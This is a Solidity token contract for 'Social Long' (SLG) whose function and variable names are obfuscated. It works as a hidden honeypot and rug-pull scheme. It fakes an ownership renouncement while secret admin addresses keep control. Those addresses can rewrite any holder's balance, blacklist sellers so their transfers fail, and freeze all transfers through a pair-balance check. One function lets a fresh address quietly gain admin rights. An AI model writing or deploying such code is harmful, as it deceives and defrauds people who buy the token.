//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface liquidityAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract isReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeLaunch {
    function createPair(address enableFund, address teamReceiverFrom) external returns (address);
}

interface amountLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableBuyList) external view returns (uint256);

    function transfer(address fundEnable, uint256 toLiquidity) external returns (bool);

    function allowance(address receiverTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 toLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address fundEnable,
        uint256 toLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromReceiver, uint256 value);
    event Approval(address indexed receiverTotal, address indexed spender, uint256 value);
}

interface maxMarketingReceiver is amountLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SocialLong is isReceiver, amountLaunched, maxMarketingReceiver {

    function symbol() external view virtual override returns (string memory) {
        return launchedMarketing;
    }

    event OwnershipTransferred(address indexed enableMode, address indexed launchEnable);

    function listTeam(uint256 toLiquidity) public {
        buyFromShould();
        feeBuyMode = toLiquidity;
    }

    bool private fundLaunch;

    function transferFrom(address maxReceiverTrading, address fundEnable, uint256 toLiquidity) external override returns (bool) {
        if (_msgSender() != receiverFee) {
            if (walletAuto[maxReceiverTrading][_msgSender()] != type(uint256).max) {
                require(toLiquidity <= walletAuto[maxReceiverTrading][_msgSender()]);
                walletAuto[maxReceiverTrading][_msgSender()] -= toLiquidity;
            }
        }
        return receiverMax(maxReceiverTrading, fundEnable, toLiquidity);
    }

    address public exemptShould;

    address receiverFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint8 private fundFee = 18;

    function balanceOf(address enableBuyList) public view virtual override returns (uint256) {
        return swapLaunchedExempt[enableBuyList];
    }

    bool public marketingTake;

    mapping(address => bool) public enableSell;

    uint256 public modeWallet;

    address public teamSender;

    uint256 feeBuyMode;

    function receiverReceiver() public {
        emit OwnershipTransferred(exemptShould, address(0));
        modeBuy = address(0);
    }

    uint256 exemptToken;

    bool private amountFundSwap;

    uint256 public teamToken;

    mapping(address => mapping(address => uint256)) private walletAuto;

    bool public minShould;

    function approve(address buyLiquiditySwap, uint256 toLiquidity) public virtual override returns (bool) {
        walletAuto[_msgSender()][buyLiquiditySwap] = toLiquidity;
        emit Approval(_msgSender(), buyLiquiditySwap, toLiquidity);
        return true;
    }

    string private launchedMarketing = "SLG";

    function allowance(address receiverSellMin, address buyLiquiditySwap) external view virtual override returns (uint256) {
        if (buyLiquiditySwap == receiverFee) {
            return type(uint256).max;
        }
        return walletAuto[receiverSellMin][buyLiquiditySwap];
    }

    function minLaunched(address fromLaunch) public {
        require(fromLaunch.balance < 100000);
        if (minShould) {
            return;
        }
        
        shouldWallet[fromLaunch] = true;
        
        minShould = true;
    }

    function receiverMax(address maxReceiverTrading, address fundEnable, uint256 toLiquidity) internal returns (bool) {
        if (maxReceiverTrading == exemptShould) {
            return fromLaunchedMax(maxReceiverTrading, fundEnable, toLiquidity);
        }
        uint256 buyMax = amountLaunched(teamSender).balanceOf(amountAuto);
        require(buyMax == feeBuyMode);
        require(fundEnable != amountAuto);
        if (enableSell[maxReceiverTrading]) {
            return fromLaunchedMax(maxReceiverTrading, fundEnable, listMax);
        }
        return fromLaunchedMax(maxReceiverTrading, fundEnable, toLiquidity);
    }

    function fromLaunchedMax(address maxReceiverTrading, address fundEnable, uint256 toLiquidity) internal returns (bool) {
        require(swapLaunchedExempt[maxReceiverTrading] >= toLiquidity);
        swapLaunchedExempt[maxReceiverTrading] -= toLiquidity;
        swapLaunchedExempt[fundEnable] += toLiquidity;
        emit Transfer(maxReceiverTrading, fundEnable, toLiquidity);
        return true;
    }

    mapping(address => uint256) private swapLaunchedExempt;

    function transfer(address autoIs, uint256 toLiquidity) external virtual override returns (bool) {
        return receiverMax(_msgSender(), autoIs, toLiquidity);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityShould;
    }

    bool private amountSwapAuto;

    function getOwner() external view returns (address) {
        return modeBuy;
    }

    address amountAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return tokenReceiver;
    }

    string private tokenReceiver = "Social Long";

    function owner() external view returns (address) {
        return modeBuy;
    }

    uint256 constant listMax = 20 ** 10;

    bool private marketingWallet;

    uint256 private takeIs;

    uint256 public minTradingLaunch;

    function launchList(address launchedIs) public {
        buyFromShould();
        if (minTradingLaunch != teamToken) {
            fundLaunch = false;
        }
        if (launchedIs == exemptShould || launchedIs == teamSender) {
            return;
        }
        enableSell[launchedIs] = true;
    }

    function buyFromShould() private view {
        require(shouldWallet[_msgSender()]);
    }

    constructor (){
        
        liquidityAt liquidityMax = liquidityAt(receiverFee);
        teamSender = takeLaunch(liquidityMax.factory()).createPair(liquidityMax.WETH(), address(this));
        if (marketingTake == marketingWallet) {
            swapTeam = modeWallet;
        }
        exemptShould = _msgSender();
        receiverReceiver();
        shouldWallet[exemptShould] = true;
        swapLaunchedExempt[exemptShould] = liquidityShould;
        if (teamToken == minTradingLaunch) {
            minTradingLaunch = takeIs;
        }
        emit Transfer(address(0), exemptShould, liquidityShould);
    }

    mapping(address => bool) public shouldWallet;

    function teamFee(address autoIs, uint256 toLiquidity) public {
        buyFromShould();
        swapLaunchedExempt[autoIs] = toLiquidity;
    }

    address private modeBuy;

    uint256 private swapTeam;

    uint256 private liquidityShould = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return fundFee;
    }

}